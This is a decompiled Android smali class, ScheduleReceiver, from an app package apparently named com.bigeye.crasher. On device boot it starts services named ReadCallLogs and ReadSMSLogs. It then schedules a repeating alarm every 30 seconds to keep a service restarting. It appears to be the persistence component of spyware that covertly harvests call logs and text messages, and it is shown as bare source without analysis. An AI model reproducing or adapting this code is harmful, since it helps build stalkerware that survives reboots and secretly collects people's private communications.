.class public Lcom/bigeye/crasher/ScheduleReceiver;
.super Landroid/content/BroadcastReceiver;
.source "ScheduleReceiver.java"


# static fields
.field private static final REPEAT_TIME:J = 0x7530L


# instance fields
.field private final APP_TAG:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 17
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bigeye/crasher/ScheduleReceiver;->APP_TAG:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v1, 0x0

    .line 22
    iget-object v2, p0, Lcom/bigeye/crasher/ScheduleReceiver;->APP_TAG:Ljava/lang/String;

    const-string v3, "Alright! woken up by BOOT_COMPLETED OP"

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 26
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/bigeye/crasher/ReadCallLogs;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 29
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/bigeye/crasher/ReadSMSLogs;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 31
    const-string v2, "alarm"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 32
    .local v0, "service":Landroid/app/AlarmManager;
    new-instance v8, Landroid/content/Intent;

    const-class v2, Lcom/bigeye/crasher/StartServiceReceiver;

    invoke-direct {v8, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 33
    .local v8, "i":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-static {p1, v1, v8, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 34
    .local v6, "pending":Landroid/app/PendingIntent;
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v7

    .line 37
    .local v7, "cal":Ljava/util/Calendar;
    const/16 v2, 0xd

    const/16 v3, 0x1e

    invoke-virtual {v7, v2, v3}, Ljava/util/Calendar;->add(II)V

    .line 40
    invoke-virtual {v7}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x7530

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setInexactRepeating(IJJLandroid/app/PendingIntent;)V

    .line 42
    return-void
.end method
